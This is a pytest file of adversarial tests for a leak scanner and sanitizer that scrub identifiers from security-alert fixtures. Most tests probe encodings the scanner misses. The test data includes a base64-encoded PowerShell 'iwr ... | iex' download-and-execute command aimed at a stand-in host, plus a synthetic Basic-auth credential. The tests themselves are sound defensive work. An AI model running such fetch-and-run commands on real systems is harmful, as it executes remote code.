"""Adversarial re-attack on R2's leak scanner v2, the verify pipeline and the hook (lens FXF).

Targets, after fix round 1 (D-041, SANITIZER_VERSION 2.0.0):
- ``argus.fixtures.leakscan.LeakScanner``: the word index ``_words``, address extraction
  (``_addresses_in``, ``_canonical``), the decoded views (``_views``) and ``scan_file``;
- ``build``, ``cmd_samples`` and ``cmd_verify`` in scripts/sanitize_fixtures.py;
- the fixture step of scripts/hooks/pre-commit.

Conventions, as in the sibling adversarial files:
- a docstring starting with **DEFECT** marks a test that fails on the current code on purpose and
  passes once the hole is closed;
- **LOCK-IN** tests pass today and pin behaviour that held up under attack.

All data is synthetic: documentation and private address ranges, example names, the key
``b"k" * 32``. The script and the hook are loaded with their module-level paths pointed at
``tmp_path``. Git runs only in throwaway repositories under ``tmp_path``, and the hook's temporary
directory is redirected there too. Nothing under reference/ or data/ is read, the committed
fixtures are never rewritten, and nothing here touches the network.

End-to-end tests run the real sanitizer and then ``verify``. Where the sanitizer leaves the form
today (it does for every e2e test here), that proves both layers miss it. If a later fix makes the
sanitizer map the form, the helper plants it by hand, so the test keeps proving that ``verify``
catches it.
"""

from __future__ import annotations

import argparse
import base64
import bz2
import contextlib
import gzip
import html
import importlib.machinery
import importlib.util
import io
import json
import lzma
import os
import random
import string
import subprocess
import tempfile
import time
import zipfile
from collections.abc import Callable, Iterator
from pathlib import Path
from types import ModuleType
from typing import Any
from urllib.parse import quote

import pytest
import yaml

from argus.fixtures import LeakScanner, Sanitizer
from tests.conftest import REPO_ROOT

KEY = b"k" * 32
SCRIPT = REPO_ROOT / "scripts" / "sanitize_fixtures.py"
HOOK = REPO_ROOT / "scripts" / "hooks" / "pre-commit"
HOST = "secret-hostname-x9"
USER = "jdoe-x9"
SITE = "192.0.2.0/24"


def _load(path: Path, name: str) -> ModuleType:
    loader = importlib.machinery.SourceFileLoader(name, str(path))
    spec = importlib.util.spec_from_loader(name, loader)
    assert spec is not None
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


class Env:
    """scripts/sanitize_fixtures.py with every path inside ``root`` (a fresh module per test)."""

    _count = 0

    def __init__(self, root: Path) -> None:
        Env._count += 1
        self.root = root
        self.mod = _load(SCRIPT, f"adv_fxf_sanitize_fixtures_{Env._count}")
        self.key = root / "data" / "keys" / "fixtures.key"
        self.key.parent.mkdir(parents=True)
        self.key.write_text(base64.b64encode(KEY).decode() + "\n")
        self.mod.ROOT = root
        self.mod.KEY_PATH = self.key
        self.mod.POLICY_PATH = root / "config" / "fixtures.yaml"
        self.mod.ASSETS_PATH = root / "data" / "assets" / "asset_map.yaml"
        self.mod.SAMPLES = []
        self.mod.OUT_DIR = root / "tests" / "fixtures" / "alerts"
        self.policy()

    def policy(self, **override: Any) -> None:
        data: dict[str, Any] = {
            "site_prefixes": [SITE],
            "campus_domains": ["campus.example.edu"],
            "keep_domains": ["example.org"],
            "literals": {"Campus University": "Example University"},
            "fields": {
                "host": ["host.name"],
                "user": ["user.name", "winlog.event_data.TargetUserName"],
                "email": ["user.email"],
                "domain": ["url.domain"],
                "id": ["_id", "kibana.alert.uuid"],
            },
            "denylist_extra": [],
        }
        data.update(override)
        self.mod.POLICY_PATH.parent.mkdir(parents=True, exist_ok=True)
        self.mod.POLICY_PATH.write_text(yaml.safe_dump(data))

    def assets(self, networks: list[dict[str, Any]]) -> None:
        self.mod.ASSETS_PATH.parent.mkdir(parents=True, exist_ok=True)
        self.mod.ASSETS_PATH.write_text(yaml.safe_dump({"networks": networks}))

    def sample(self, source: dict[str, Any]) -> Path:
        index = len(self.mod.SAMPLES)
        path = self.root / "reference" / f"alert{index}.json"
        path.parent.mkdir(parents=True, exist_ok=True)
        source = {
            "kibana.alert.rule.name": f"Synthetic rule {index}",
            "kibana.alert.rule.type": "query",
            **source,
        }
        path.write_text(
            json.dumps({"_index": ".alerts-x", "_id": f"Id{index:017d}", "_source": source})
        )
        self.mod.SAMPLES.append(path)
        return path

    def corpus(self, source: dict[str, Any]) -> None:
        day = self.root / "data" / "corpus" / "2026-01-01"
        day.mkdir(parents=True, exist_ok=True)
        doc = {"_index": "logs-x", "_id": "c1", "_source": source}
        with gzip.open(day / "alerts.jsonl.gz", "wt", encoding="utf-8") as fh:
            fh.write(json.dumps(doc) + "\n")

    def raw(self) -> list[dict[str, Any]]:
        return [self.mod.wire(json.loads(p.read_text())) for p in self.mod.SAMPLES]

    def write(self, rel: str, text: str) -> Path:
        path = self.root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
        return path

    def fixture_of_last_sample(self, rel: str = "tests/fixtures/alerts/f.json") -> Path:
        """What ``samples`` writes for the newest sample (same build, same serialization)."""
        raw = self.raw()
        sanitizer: Sanitizer = self.mod.build(raw)[0]
        clean = sanitizer.sanitize(raw[-1])
        return self.write(rel, json.dumps(clean, indent=2, sort_keys=True, ensure_ascii=False))

    def verify(self, *files: Path | str) -> int:
        return int(self.mod.cmd_verify(argparse.Namespace(files=[str(f) for f in files])))

    def samples(self, out: Path | str | None = None) -> int:
        target = str(out if out is not None else self.mod.OUT_DIR)
        return int(self.mod.cmd_samples(argparse.Namespace(out=target)))


@pytest.fixture
def env(tmp_path: Path) -> Env:
    return Env(tmp_path / "repo")


@contextlib.contextmanager
def _quiet() -> Iterator[io.StringIO]:
    out = io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
        yield out


def _verify_e2e(env: Env, survivor: str, plant: Any) -> int:
    """Sanitize the newest sample as ``samples`` would, then ``verify`` the fixture.

    Today the sanitizer leaves ``survivor`` in the fixture, so a pass proves that both layers miss
    it. If a sanitizer fix maps it, ``plant`` (the leaking value) is planted by hand so that the
    test still proves ``verify`` catches the form."""
    fixture = env.fixture_of_last_sample()
    text = fixture.read_text()
    if survivor not in text:
        planted = f'"planted": {json.dumps(plant)}, "_index"'
        fixture.write_text(text.replace('"_index"', planted, 1))
    with _quiet():
        return env.verify(fixture)


def _scan_value(ident: str, value: Any, networks: tuple[str, ...] = ()) -> list[str]:
    """Identifiers found when ``value`` is a JSON fixture (as stored, as strings, decoded views)."""
    scanner = LeakScanner({ident}, networks=networks)
    return [leak.identifier for leak in scanner.scan_document(json.dumps(value), "f.json")]


# ====================================================================== FXF-01 (MEDIUM)
# Short alphabetic names (3-4 letters, no digit, '-' or '.') are matched in their own case only.
# The sanitizer folds every name of 3+ characters, so the scanner is STRICTER than the sanitizer
# here. Both miss the same glued forms, because the sanitizer's boundary treats '_' as a word
# character.


@pytest.mark.parametrize(
    ("ident", "text"),
    [
        ("ravi", "uploaded RAVI_notes.pdf"),
        ("amit", "share \\\\Amit_PC\\docs"),
        ("neha", "NEHA logged in"),
    ],
)
def test_fxf01_short_alphabetic_names_ignore_case(ident: str, text: str) -> None:
    """DEFECT FXF-01: a 3-4 letter user name ("ravi") is denylisted case-sensitively, so "RAVI"
    or "Amit" in free text passes the scanner. Only all-capital short codes (EE, CSE, META:
    public department codes) need their own case; see the short-codes lock-in."""
    assert LeakScanner({ident}).scan_text(text)


def test_fxf01_end_to_end_capitalised_short_user_glued_to_underscore(env: Env) -> None:
    """DEFECT FXF-01 (end to end): user.name "ravi" is mapped, but "RAVI_notes.pdf" in the message
    survives the sanitizer ('_' is a word character for its dictionary), and ``verify`` passes the
    fixture (the scanner looks for "ravi" in exact case only)."""
    env.sample({"user": {"name": "ravi"}, "message": "uploaded RAVI_notes.pdf"})
    assert _verify_e2e(env, "RAVI_notes", "uploaded RAVI_notes.pdf") == 1


# ====================================================================== FXF-02 (MEDIUM)
# Identifiers that start or end with a non-alphanumeric character go to the ``_odd`` regex and are
# matched only together with that character. A Windows machine account "LAB-PC07$" is common in
# security events: the host name "LAB-PC07" without the '$' is never looked for.


@pytest.mark.parametrize(
    ("ident", "text"),
    [
        ("LAB-PC07$", "logon from LAB-PC07 failed"),
        ("LAB-PC07$", "workstation lab-pc07.campus.example.edu"),
        ("_svc-backup9", "svc-backup9 started"),
    ],
)
def test_fxf02_odd_identifiers_match_their_alphanumeric_core(ident: str, text: str) -> None:
    """DEFECT FXF-02: the alphanumeric core of an odd identifier (a machine account without its
    trailing '$') is not denylisted. The scanner is meant to be looser than the sanitizer; here it
    is stricter."""
    assert LeakScanner({ident}).scan_text(text)


def test_fxf02_end_to_end_machine_account_without_dollar(env: Env) -> None:
    """DEFECT FXF-02 (end to end): TargetUserName "LAB-PC07$" is mapped, but "LAB-PC07" in the
    message survives the sanitizer (its dictionary holds only "lab-pc07$"), and ``verify``
    passes it."""
    env.sample(
        {
            "winlog": {"event_data": {"TargetUserName": "LAB-PC07$"}},
            "message": "workstation LAB-PC07 locked",
        }
    )
    assert _verify_e2e(env, "LAB-PC07 ", "workstation LAB-PC07 locked") == 1


# ====================================================================== FXF-03 (MEDIUM)
# ``_V6`` refuses to start after ':' or a hex digit, and it has no right-hand boundary. The SMTP
# address literal "[IPv6:2001:db8::5]" (RFC 5321: EHLO and Received headers) is read as
# 6:2001:db8::5, a different address. "client:2001:db8::5" yields an unparsable ":2001:db8::5".


@pytest.mark.parametrize(
    "text",
    [
        "Received: from mx.example.org (mx.example.org [IPv6:2001:db8::5]) by relay",
        "client:2001:db8::5 refused",
        "src=[IPv6:2001:db8::5]:25",
    ],
)
def test_fxf03_ipv6_after_a_colon_or_hex_letter_is_found(text: str) -> None:
    """DEFECT FXF-03: a denylisted IPv6 address after "IPv6:" or "key:" is never extracted."""
    assert LeakScanner({"2001:db8::5"}).scan_text(text)


def test_fxf03_end_to_end_smtp_ipv6_literal(env: Env) -> None:
    """DEFECT FXF-03 (end to end): source.ip 2001:db8::5 is mapped, but the same address in a
    Received header's "[IPv6:...]" literal survives the sanitizer (its ``_IPV6`` needs a non-word,
    non-':' before the address) and ``verify`` passes it."""
    message = "Received: from mx (mx [IPv6:2001:db8::5]) by relay"
    env.sample({"source": {"ip": "2001:db8::5"}, "message": message})
    assert _verify_e2e(env, "IPv6:2001:db8::5", message) == 1


# ====================================================================== FXF-04 (MEDIUM)
# Only \x and \u escapes are decoded, and nested JSON only when the WHOLE string is JSON. A
# syslog line whose payload is JSON (NXLog/rsyslog forwarding Windows events) keeps \t, \n and \r
# as two characters, so "Account Name:\t\tjdoe-x9" reads as the word "tjdoe-x9".

SYSLOG_JSON = (
    '<14>Oct 12 dc01 nxlog: {"EventID":4625,"Message":"An account failed to log on.\\r\\n'
    '\\tAccount Name:\\t\\tjdoe-x9\\r\\n\\tWorkstation:\\t\\tWS-77"}'
)


@pytest.mark.parametrize(
    "value",
    [
        {"event": {"original": SYSLOG_JSON}},
        {"message": "first line\\njdoe-x9 logged in"},
        {"message": "user=\\tjdoe-x9"},
    ],
)
def test_fxf04_json_escapes_inside_text_are_decoded(value: Any) -> None:
    """DEFECT FXF-04: an identifier right after a literal ``\\t``, ``\\n`` or ``\\r`` escape is
    glued to the escape letter ("tjdoe-x9"), and no view decodes these escapes outside a string
    that is JSON as a whole."""
    assert _scan_value(USER, value)


def test_fxf04_end_to_end_syslog_wrapped_windows_event(env: Env) -> None:
    """DEFECT FXF-04 (end to end): user.name "jdoe-x9" is mapped, but the same account in the
    syslog-wrapped JSON event.original survives the sanitizer ('t' before it is a word character)
    and ``verify`` passes it."""
    env.sample({"user": {"name": USER}, "event": {"original": SYSLOG_JSON}})
    assert _verify_e2e(env, "tjdoe-x9", SYSLOG_JSON) == 1


# ====================================================================== FXF-05 (MEDIUM)
# No view decodes base64. Encoded PowerShell (-enc, UTF-16LE base64) is what many Windows
# detection rules fire on, and HTTP Basic credentials carry a campus login (and its password).

PS_ENC = base64.b64encode(f"iwr http://{HOST}/a.ps1 | iex".encode("utf-16-le")).decode()
BASIC = base64.b64encode(f"{USER}:hunter2-x".encode()).decode()


@pytest.mark.parametrize(
    ("ident", "value"),
    [
        (HOST, {"process": {"command_line": f"powershell.exe -NoP -enc {PS_ENC}"}}),
        (USER, {"http": {"request": {"headers": {"authorization": f"Basic {BASIC}"}}}}),
        (HOST, {"message": base64.b64encode(f"beacon to {HOST}".encode()).decode()}),
    ],
)
def test_fxf05_base64_payloads_are_decoded(ident: str, value: Any) -> None:
    """DEFECT FXF-05: an identifier inside base64 (UTF-8 or UTF-16LE) is never decoded, so the
    encoded form passes the scanner, although anyone can read it back."""
    assert _scan_value(ident, value)


def test_fxf05_end_to_end_basic_auth_header(env: Env) -> None:
    """DEFECT FXF-05 (end to end): user.name "jdoe-x9" is mapped, but the Basic Authorization
    header keeps "jdoe-x9:<password>" in base64. The sanitizer leaves it, and ``verify`` passes
    the fixture."""
    header = f"Basic {BASIC}"
    env.sample(
        {"user": {"name": USER}, "http": {"request": {"headers": {"authorization": header}}}}
    )
    assert _verify_e2e(env, BASIC, header) == 1


# ====================================================================== FXF-06 (MEDIUM)


@pytest.mark.parametrize(
    "encode",
    [
        lambda t: t.encode("utf-16"),  # BOM + UTF-16LE: PowerShell 5 "Out-File" / ">" default
        lambda t: b"\xfe\xff" + t.encode("utf-16-be"),
        lambda t: t.encode("utf-16-le"),  # no BOM
        lambda t: t.encode("utf-32"),
    ],
    ids=["utf16-bom", "utf16be-bom", "utf16le", "utf32"],
)
def test_fxf06_utf16_and_utf32_files_are_scanned(
    tmp_path: Path, encode: Callable[[str], bytes]
) -> None:
    """DEFECT FXF-06: ``scan_file`` decodes every file as UTF-8 (errors replaced). A UTF-16 file
    becomes "s\\x00e\\x00c..." with a NUL after every letter, so no identifier or address in it is
    ever found. Windows PowerShell writes UTF-16 by default."""
    path = tmp_path / "export.json"
    path.write_bytes(encode(json.dumps({"host": {"name": HOST}, "ip": "10.1.2.3"}) + "\n"))
    found = {leak.identifier for leak in LeakScanner({HOST, "10.1.2.3"}).scan_file(path)}
    assert found >= {HOST, "10.1.2.3"}


# ====================================================================== FXF-07 (MEDIUM)


def _zip(text: str) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("alerts.json", text)
    return buffer.getvalue()


_PAYLOAD = json.dumps({"host": {"name": HOST}}) + "\n"


@pytest.mark.parametrize(
    ("name", "data"),
    [
        ("cassette.jsonl.GZ", gzip.compress(_PAYLOAD.encode())),
        ("cassette.tgz", gzip.compress(_PAYLOAD.encode())),
        ("cassette.json", gzip.compress(_PAYLOAD.encode())),  # gzip content, plain name
        ("cassette.jsonl.gz", gzip.compress(_PAYLOAD.encode() * 50)[:-8]),  # truncated
        ("cassette.jsonl.gz", gzip.compress(gzip.compress(_PAYLOAD.encode()))),  # twice
        ("cassette.jsonl.bz2", bz2.compress(_PAYLOAD.encode())),
        ("cassette.jsonl.xz", lzma.compress(_PAYLOAD.encode())),
        ("cassette.zip", _zip(_PAYLOAD)),
    ],
    ids=["GZ-suffix", "tgz", "gzip-in-json", "truncated-gz", "double-gz", "bz2", "xz", "zip"],
)
def test_fxf07_compressed_fixtures_are_decompressed_or_refused(
    tmp_path: Path, name: str, data: bytes
) -> None:
    """DEFECT FXF-07: only a file named exactly ``*.gz`` (lower case) is gunzipped, and only when
    the stream is intact. A truncated stream (an interrupted capture), any other compressor or
    name, or a second layer are all scanned as compressed bytes, in which nothing is ever found.
    The hook documents that it verifies "any file type". A file the scanner cannot read should be
    decompressed (with a size cap) or reported as unscannable, never passed."""
    path = tmp_path / name
    path.write_bytes(data)
    assert LeakScanner({HOST}).scan_file(path)


# ====================================================================== pre-commit harness


def _git(repo: Path, *args: str) -> None:
    subprocess.run(  # noqa: S603
        ["git", "-c", "core.hooksPath=/dev/null", "-c", "commit.gpgsign=false", *args],  # noqa: S607
        cwd=repo,
        check=True,
        capture_output=True,
    )


def _commit(repo: Path) -> None:
    _git(repo, "-c", "user.name=t", "-c", "user.email=t@example.org", "commit", "-qm", "c")


@pytest.fixture
def hook_repo(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> tuple[Path, Callable[[], int], list[list[str]]]:
    """A throwaway git repo and the real hook. Its ``verify`` call runs in-process, in the
    hook's temporary directory with the hook's relative paths, against synthetic raw sources."""
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q")
    # The synthetic sources live in the repo; they must never be what makes the hook refuse.
    (repo / ".git" / "info" / "exclude").write_text("/data/\n/reference/\n/config/\n")
    env = Env(repo)
    env.sample({"host": {"name": HOST}})
    staging = tmp_path / "tmp"
    staging.mkdir()
    monkeypatch.setattr(tempfile, "tempdir", str(staging))
    monkeypatch.chdir(repo)
    hook = _load(HOOK, "adv_fxf_pre_commit")
    hook.ROOT = repo
    calls: list[list[str]] = []
    real_run = subprocess.run

    def fake_run(cmd: Any, *args: Any, **kwargs: Any) -> Any:
        if isinstance(cmd, list) and "scripts/sanitize_fixtures.py" in cmd:
            files = cmd[cmd.index("verify") + 1 :]
            calls.append(files)
            out, err = io.StringIO(), io.StringIO()
            with (
                contextlib.chdir(kwargs["cwd"]),
                contextlib.redirect_stdout(out),
                contextlib.redirect_stderr(err),
            ):
                code = env.verify(*files)
            return subprocess.CompletedProcess(cmd, code, out.getvalue(), err.getvalue())
        return real_run(cmd, *args, **kwargs)

    monkeypatch.setattr(hook.subprocess, "run", fake_run)
    return repo, hook.main, calls


def _refused(main: Callable[[], int]) -> bool:
    """The hook refuses the commit: a non-zero exit or an exception (git aborts on both)."""
    try:
        with _quiet():
            return main() != 0
    except Exception:  # any crash is a non-zero exit for git
        return True


# ====================================================================== FXF-08 (MEDIUM)


def test_fxf08_hook_verifies_a_type_changed_fixture(
    hook_repo: tuple[Path, Callable[[], int], list[list[str]]],
) -> None:
    """DEFECT FXF-08: ``staged_files`` uses ``--diff-filter=ACMR``, which leaves out ``T`` (type
    change). A fixture committed as a symlink and then replaced by a regular file is never
    verified (nor checked for forbidden paths or secrets), so a leaking file is committed. The
    filter should be ``d`` (everything but deletions)."""
    repo, main, calls = hook_repo
    fixtures = repo / "tests" / "fixtures"
    fixtures.mkdir(parents=True)
    (fixtures / "real.json").write_text('{"m": "clean"}')
    (fixtures / "a.json").symlink_to("real.json")
    _git(repo, "add", "-A")
    _commit(repo)
    (fixtures / "a.json").unlink()
    (fixtures / "a.json").write_text(json.dumps({"m": f"relayed by {HOST}"}))
    _git(repo, "add", "-A")
    assert _refused(main), f"verify ran on {calls}"


# ====================================================================== FXF-09 (MEDIUM)


def test_fxf09_samples_never_deletes_what_it_did_not_write(env: Env) -> None:
    """DEFECT FXF-09: ``samples --out X`` renames any existing X to ``.X.old`` and ``rmtree``s
    it. ``--out .`` (or ``tests``, or ``tests/fixtures``) therefore deletes the whole tree: here
    the repository with its fixture key and raw sources. Losing the key means fixtures can never
    be regenerated, and an expired capture cannot be taken again. ``samples`` should refuse an
    existing directory that it did not write (no MANIFEST.json, or files it does not list)."""
    env.sample({"message": "clean"})
    sentinel = env.write("data/corpus/keep.txt", "irreplaceable")
    with _quiet(), contextlib.suppress(SystemExit):
        env.samples(env.root)
    assert env.key.is_file(), "the fixture key was deleted"
    assert sentinel.is_file(), "unrelated data under --out was deleted"


def test_fxf09_samples_does_not_replace_a_file(env: Env) -> None:
    """DEFECT FXF-09: ``--out`` naming an existing FILE: the file is moved to ``.<name>.old``
    (``rmtree`` fails on a file, silently) and a directory takes its place. The leftover sits
    under tests/fixtures/, where ``git add`` picks it up."""
    env.sample({"message": "clean"})
    target = env.write("tests/fixtures/notes.txt", "mine")
    with _quiet(), contextlib.suppress(SystemExit):
        env.samples(target)
    assert target.is_file()
    assert target.read_text() == "mine"
    assert not (target.parent / ".notes.txt.old").exists()


# ====================================================================== FXF-10 (LOW)


def test_fxf10_samples_uses_the_same_denylist_as_verify(env: Env) -> None:
    """DEFECT FXF-10: ``samples`` harvests (and scans with) only reference/alert*.json, while
    ``verify`` also uses every capture under data/corpus/. A sample whose free text names a host
    known only from the corpus is written with that name and reports "leaks: 0" (exit 0). The
    very next ``verify``, and the hook, refuse it, and re-running ``samples`` cannot fix it."""
    env.sample({"message": f"beacon to {HOST} observed"})
    env.corpus({"host": {"name": HOST}})
    with _quiet():
        samples_code = env.samples()
        verify_code = env.verify()
    assert not (samples_code == 0 and verify_code == 1)


# ====================================================================== FXF-11 (LOW)


def test_fxf11_default_verify_scans_a_symlinks_own_name(env: Env) -> None:
    """DEFECT FXF-11: with no arguments, ``verify`` passes absolute paths to ``_path_parts``,
    which ``resolve()``s symlinks. A symlink named after an identifier and pointing to a clean
    file is judged by its target's name, but git commits the link's name. (The hook passes
    relative paths and catches it; the gate runs the default mode.)"""
    env.sample({"host": {"name": HOST}})
    env.write("tests/fixtures/clean.json", '{"m": "ok"}')
    (env.root / "tests" / "fixtures" / f"{HOST}.json").symlink_to("clean.json")
    with _quiet():
        assert env.verify() == 1


def test_fxf11_default_verify_scans_a_dangling_symlinks_target_text(env: Env) -> None:
    """DEFECT FXF-11: a dangling symlink under tests/fixtures/ is skipped (``is_file()`` is
    False), but git commits its target path as the blob, which here names the host."""
    env.sample({"host": {"name": HOST}})
    env.write("tests/fixtures/clean.json", '{"m": "ok"}')
    (env.root / "tests" / "fixtures" / "link.json").symlink_to(f"../../{HOST}/gone.json")
    with _quiet():
        assert env.verify() == 1


# ====================================================================== FXF-12 (LOW)


def test_fxf12_verify_never_prints_an_identifier_in_an_error(env: Env) -> None:
    """DEFECT FXF-12: ``verify`` on a path that cannot be read (missing here; a directory or
    an unreadable file behaves alike) raises an uncaught OSError. Its message and the traceback
    print the path, which is named after a denylisted host. It should report a safe label and
    exit 1."""
    env.sample({"host": {"name": HOST}})
    missing = env.root / "tests" / "fixtures" / f"{HOST}.json"
    with _quiet() as out:
        try:
            outcome: Any = env.verify(missing)
        except Exception as exc:
            outcome = f"{type(exc).__name__}: {exc}"
    assert outcome == 1
    assert HOST not in out.getvalue()


def test_fxf12_bad_asset_range_is_not_echoed(env: Env) -> None:
    """DEFECT FXF-12: a malformed asset-map range ("10.31.0.0/16 Hostel-Q9 wing") makes
    ``asset_identifiers`` raise ValueError carrying the raw text, asset name included, and
    ``verify`` crashes with it on stderr."""
    env.sample({"host": {"name": HOST}})
    env.assets([{"name": "Hostel-Q9", "range": "10.31.0.0/16 Hostel-Q9 wing"}])
    with _quiet() as out:
        try:
            outcome: Any = env.verify()
        except Exception as exc:
            outcome = str(exc)
    assert "Hostel-Q9" not in f"{outcome}{out.getvalue()}"


# ====================================================================== FXF-13 (LOW)

# Unrelated encodings in the same string: each decoder gives another full-length variant.
_NOISE = " p+q %2541 &amp;amp;lt; \\x5cx41 %26amp%3B"
_THREE_STEP = html.escape(quote(HOST.replace("-", "\\x2d"))).replace("%", "&#37;")


@pytest.mark.parametrize(
    "value",
    [
        HOST.replace("-", "%25252525" + "2D"),  # five URL layers: one more than _DECODE_ROUNDS
        _THREE_STEP + _NOISE,  # HTML -> URL -> \x: found alone, hidden by the noise
    ],
    ids=["five-url-layers", "three-steps-plus-noise"],
)
def test_fxf13_decoding_budget_cannot_be_exhausted(value: str) -> None:
    """DEFECT FXF-13: decoded views are bounded per STRING: 4 rounds and 24 views across every
    combination of 5 decoders. Noise anywhere in the same string uses up the views, so an
    identifier that needs 3 steps is not decoded (it is found when the string holds it alone).
    Decoding should go to a fixed point per span, not explore every combination."""
    assert _scan_value(HOST, {"url": {"original": value}})


def test_fxf13_precondition_three_steps_alone_are_found() -> None:
    """LOCK-IN: the three-step chain of FXF-13 is decoded when the string holds nothing else."""
    assert _scan_value(HOST, {"url": {"original": _THREE_STEP}})


# ====================================================================== FXF-14 (LOW)


@pytest.mark.parametrize(
    ("ident", "text"),
    [
        (HOST, HOST.replace("-", "\\U0000002d")),  # Python/YAML long escape
        (HOST, HOST.replace("-", "\\055")),  # C/bash octal escape
        (HOST, "proctitle=" + f"ping {HOST}".encode().hex().upper()),  # auditd hex encoding
        ("müller-x9", "user m\\xc3\\xbcller-x9"),  # \x escapes of UTF-8 bytes (nginx logs)
    ],
    ids=["U-escape", "octal", "hex-string", "x-utf8"],
)
def test_fxf14_other_escape_spellings_are_decoded(ident: str, text: str) -> None:
    """DEFECT FXF-14: only ``\\xHH`` (each read as one Latin-1 character) and ``\\uHHHH`` are
    unescaped. ``\\U0000002d``, octal ``\\055``, hex-encoded strings and ``\\x``-escaped UTF-8
    bytes all hide an identifier."""
    assert _scan_value(ident, {"message": text})


# ====================================================================== FXF-15 (LOW)


@pytest.mark.parametrize(
    ("ident", "text"),
    [
        ("10.1.2.3", "GET http://167838211/x"),  # integer IPv4 (curl, browsers accept it)
        ("10.1.2.3", "GET http://0x0a010203/x"),  # hex IPv4
        ("10.1.2.3", "label host_10_1_2_3 up"),  # '_'-separated (metric labels, slugs)
        ("2001:db8::5", "5." + "0." * 23 + "8.b.d.0.1.0.0.2.ip6.arpa"),  # IPv6 reverse name
        ("10.1.2.3", "64:ff9b::a01:203"),  # NAT64 well-known prefix
        ("10.1.2.3", "2002:a01:203::1"),  # 6to4
        ("10.1.2.3/24", "host 10.1.2.3 up"),  # identifier in interface notation names the host
        ("2001:db8::5%eth0", "nbr 2001:db8::5%eth0 up"),  # a zone id: not even itself matches
    ],
    ids=["int", "hex", "underscore", "ip6-arpa", "nat64", "6to4", "iface-ident", "zone-ident"],
)
def test_fxf15_other_address_spellings_are_found(ident: str, text: str) -> None:
    """DEFECT FXF-15: address forms the extractor does not canonicalize. The scanner has no
    ``ip6.arpa`` reader (the sanitizer does) and no reader for integer, hex, '_'-separated or
    NAT64/6to4-embedded IPv4. ``_canonical`` also turns an interface-notation identifier into its
    NETWORK, dropping the host, and keeps a zone id that the extractor strips from text."""
    assert LeakScanner({ident}).scan_text(text)


# ====================================================================== FXF-16 (LOW)


def test_fxf16_identifier_whose_lowercase_is_longer_matches_itself() -> None:
    """DEFECT FXF-16: ``_lengths`` holds the lengths of the FOLDED names, but ``_words`` compares
    them with the length of the span in the text. "İ" lower-cases to two characters, so an
    identifier containing it never matches, not even its exact spelling."""
    assert LeakScanner({"aİb-x9"}).scan_text("host aİb-x9 up")


# ====================================================================== FXF-17 (LOW)


def _corpus_sized_denylist() -> set[str]:
    """~41k entries shaped like the real denylist: addresses, host names, short codes, and the long
    entries harvesting produces (URL and ``field: value`` spans, DN sequences, e-mails)."""
    rng = random.Random(0)
    ids: set[str] = set()
    while len(ids) < 20_000:
        ids.add(f"10.{rng.randrange(256)}.{rng.randrange(256)}.{rng.randrange(256)}")
    while len(ids) < 36_000:
        ids.add("".join(rng.choices(string.ascii_lowercase, k=rng.randrange(5, 14))) + "-pc")
    while len(ids) < 40_000:
        ids.add("".join(rng.choices(string.ascii_uppercase, k=rng.randrange(2, 5))))
    alphabet = string.ascii_lowercase + ".-"
    for length in range(5, 200):
        for _ in range(5):
            ids.add("x" + "".join(rng.choices(alphabet, k=length)) + "x")
    return ids


def test_fxf17_pathological_megabyte_scans_in_seconds(tmp_path: Path) -> None:
    """DEFECT FXF-17: ``_words`` walks every word end within ``longest`` characters of every word
    start, so its cost is words x (longest / word length). Each of up to 24 decoded views is
    scanned again in full. With long denylist entries (up to 200 characters), a fixture string of
    1-character words that also holds a few encodings projects to over a minute per MB; a hex dump
    alone is about 5 s per MB per pass. Index names by their first word (or first k characters) so
    a start that begins no name is rejected at once, and bound the views by size."""
    scanner = LeakScanner(_corpus_sized_denylist())
    unit = "a.%41.b+c.&amp;.d\\x41.e.%2541."
    text = (unit * (30_000 // len(unit) + 1))[:30_000]
    path = tmp_path / "payload.json"
    path.write_text(json.dumps({"payload": {"printable": text}}))
    start = time.perf_counter()
    scanner.scan_file(path)
    projected = (time.perf_counter() - start) * 1_000_000 / path.stat().st_size
    assert projected < 10.0, f"projected {projected:.0f} s for a 1 MB fixture"


# ====================================================================== FXF-18 (LOW)

_ESCAPED = HOST.replace("-", "\\u002d")


@pytest.mark.parametrize(
    "value",
    [
        json.dumps({"inner": json.dumps({"h": _ESCAPED})}),
        json.dumps(
            {
                "eventName": "PutUserPolicy",
                "requestParameters": {
                    "policyDocument": json.dumps({"Resource": f"arn:aws:s3:::{_ESCAPED}/*"})
                },
            }
        ),
    ],
    ids=["nested-twice", "cloudtrail-policy-document"],
)
def test_fxf18_json_nested_twice_is_decoded(value: str) -> None:
    """DEFECT FXF-18: ``_nested_json`` returns the keys and values of the inner document joined by
    newlines. When that text starts with a key, it is no longer JSON, so the next level is never
    parsed. An escaped identifier in JSON nested twice is therefore missed, as in a CloudTrail
    ``policyDocument`` inside ``event.original``. Today it is found only when the outer level is a
    list. Each inner string should be its own view (or be parsed iteratively)."""
    assert _scan_value(HOST, {"event": {"original": value}})


# ====================================================================== LOCK-IN: what held up


@pytest.mark.parametrize(
    "text",
    ["alpha-beta-gamma", "ALPHA-BETA-GAMMA rest", "x beta-gamma y", "alpha-beta_gamma"],
)
def test_lockin_overlapping_identifiers_still_flag_the_file(text: str) -> None:
    """LOCK-IN: leftmost-longest selection can hide a second, overlapping identifier ("beta-gamma"
    inside "alpha-beta-gamma"), but only behind a hit, so the file is flagged anyway; alone, the
    second identifier is found."""
    assert LeakScanner({"alpha-beta", "beta-gamma"}).scan_text(text)


@pytest.mark.parametrize(
    ("ident", "text"),
    [
        ("müller-x9", "logon MÜLLER-X9 ok"),  # non-ASCII inside: folded set, any case
        ("josé", "user JOSÉ logged in"),  # ends with a non-ASCII letter: the odd pattern
        ("Ölab-x9", "host ölab-x9 up"),  # starts with a non-ASCII letter
        (HOST, f"İstanbul relay {HOST} ok"),  # 'İ' elsewhere: the per-piece lower() path
        (HOST, f"{HOST.upper()}.campus"),
        ("ab12", "AB12 up"),  # short with a digit: folded
        ("x" * 3 + "-" + "y" * 300, "z " + "x" * 3 + "-" + "y" * 300 + " z"),  # longer than runs
    ],
)
def test_lockin_word_index_finds_these_forms(ident: str, text: str) -> None:
